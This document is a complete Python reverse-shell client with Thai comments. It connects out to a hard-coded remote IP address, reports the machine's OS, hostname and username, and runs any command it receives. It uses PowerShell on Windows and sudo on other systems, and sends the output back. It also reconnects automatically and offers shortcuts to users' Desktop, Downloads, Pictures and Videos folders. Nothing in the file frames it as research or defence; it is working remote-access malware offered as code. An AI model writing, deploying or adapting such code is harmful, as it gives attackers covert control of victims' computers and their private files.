import socket
import subprocess
import platform
import time
import os

HOST = '124.120.59.165'
PORT = 9999
PASSWORD = "mysecretpassword"
RECONNECT_DELAY = 1
IS_WINDOWS = (platform.system().lower() == 'windows')

if IS_WINDOWS:
    default_dir = "C:\\"
else:
    default_dir = "/"

current_dir = default_dir

def get_username_from_home():
    home = os.path.expanduser("~")
    base_name = os.path.basename(home)
    if base_name:
        return base_name
    return "unknown_user"

def map_cd_keyword(keyword, os_info, username):
    # เมื่อลูกค้าได้รับคำสั่ง cd desktop (หรืออื่นๆ)
    # ให้ map path ตาม OS ที่นี่
    home = os.path.expanduser("~")

    if os_info == "windows":
        base = f"C:\\Users\\{username}"
        map_dir = {
            "desktop": os.path.join(base, "Desktop"),
            "download": os.path.join(base, "Downloads"),
            "photo": os.path.join(base, "Pictures"),
            "video": os.path.join(base, "Videos"),
            "c": "C:\\",
            "d": "D:\\",
            "e": "E:\\",
            "more": "C:\\"
        }
        return map_dir.get(keyword, None)
    elif os_info in ["linux", "darwin"]:
        base = home
        map_dir = {
            "desktop": os.path.join(base, "Desktop"),
            "download": os.path.join(base, "Downloads"),
            "photo": os.path.join(base, "Pictures"),
            "video": os.path.join(base, "Videos"),
            "c": "/",
            "d": "/",
            "e": "/",
            "more": "/"
        }
        return map_dir.get(keyword, None)
    else:
        # android, ios, or other unix-like
        base = home
        map_dir = {
            "desktop": os.path.join(base, "Desktop"),
            "download": os.path.join(base, "Download"),
            "photo": os.path.join(base, "Pictures"),
            "video": os.path.join(base, "Videos"),
            "c": "/",
            "d": "/",
            "e": "/",
            "more": "/"
        }
        return map_dir.get(keyword, None)

def run_command(command, current_dir, os_info, username):
    parts = command.strip().split(maxsplit=1)
    if len(parts) > 0 and parts[0] == 'cd':
        if len(parts) > 1:
            arg = parts[1]
            # ตรวจว่าคือ keyword พิเศษหรือไม่
            special_keywords = ["desktop","download","photo","video","c","d","e","more"]
            if arg.lower() in special_keywords:
                target_dir = map_cd_keyword(arg.lower(), os_info, username)
                if target_dir and os.path.isdir(target_dir):
                    return "", target_dir
                else:
                    return f"cd: no such directory: {target_dir}", current_dir
            else:
                # เป็น path ปกติ
                if not os.path.isabs(arg):
                    arg = os.path.join(current_dir, arg)
                if os.path.isdir(arg):
                    return "", arg
                else:
                    return f"cd: no such directory: {arg}", current_dir
        else:
            # cd without args
            if IS_WINDOWS:
                return "", "C:\\"
            else:
                # Unix-like root
                return "", "/"

    # รันคำสั่งด้วยสิทธิ์ปกติ
    if IS_WINDOWS:
        cmd = ["powershell", "-Command", command]
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, cwd=current_dir)
    else:
        # บน linux/mac/android/ios สมมุติว่าถ้าต้องใช้ sudo ก็ใช้ได้
        sudo_command = f"sudo {command}"
        result = subprocess.run(sudo_command, shell=True, capture_output=True, text=True, cwd=current_dir)

    output = (result.stdout or "") + (result.stderr or "")
    return output.strip(), current_dir

def main():
    global current_dir
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(5)
            client_socket.connect((HOST, PORT))
            client_socket.settimeout(None)

            os_info = platform.system().lower()
            hostname = socket.gethostname()
            username = get_username_from_home()

            init_data = f"{os_info}:{hostname}:{username}:{PASSWORD}"
            client_socket.sendall(init_data.encode('utf-8'))

            while True:
                try:
                    command_data = client_socket.recv(1024)
                    if not command_data:
                        break
                    command = command_data.decode('utf-8', errors='replace').strip()

                    if command == '':
                        continue
                    if command.lower() == 'exit':
                        break
                    elif command.lower() == 'ping':
                        client_socket.sendall(b'pong')
                        continue
                    elif command.lower().startswith('!restart kill'):
                        break

                    output, current_dir = run_command(command, current_dir, os_info, username)
                    response = f"{hostname}|{current_dir}|{output}"
                    data_bytes = response.encode('utf-8', errors='replace')
                    client_socket.sendall(data_bytes)

                except (ConnectionResetError, ConnectionAbortedError, socket.timeout):
                    break
                except Exception as e:
                    err_resp = f"{hostname}|{current_dir}|Error {str(e)}"
                    client_socket.sendall(err_resp.encode('utf-8', errors='replace'))
            client_socket.close()
        except ConnectionRefusedError:
            time.sleep(RECONNECT_DELAY)
        except Exception:
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()
